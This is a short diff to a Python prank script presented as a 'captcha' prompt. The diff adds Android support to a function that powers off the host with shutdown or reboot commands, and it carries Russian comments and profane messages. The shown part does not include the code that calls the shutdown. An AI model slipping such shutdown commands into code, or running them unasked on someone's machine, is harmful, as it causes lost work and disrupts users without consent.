captcha_1984_XD.py
Add: android shutdown

+++ captcha_1984_XD.py
@@ -2,15 +2,20 @@ import os
 import time
 import platform
 
-counter = 0
 def shutdown_computer():
     os_name = platform.system()
     if os_name == "Windows":
         os.system("shutdown /s /t 1")
     elif os_name == "Linux":
-        os.system("shutdown -h now")
+        # Проверка на Android через присутствие переменной ANDROID_ROOT
+        if "ANDROID_ROOT" in os.environ:
+            # Команда выключения для Android (требуются root-права)
+            os.system("reboot -p")
+        else:
+            os.system("shutdown -h now")
     else:
-        print("Блять. Если у тебя мак, или какая-то другая юникс-подобная шмаль - то иди нахуй(")
+        print("Блять. Если у тебя мак или другая система - иди нахуй(")
+
 
 while True:
     print("Введи капчу - | 1984 |")
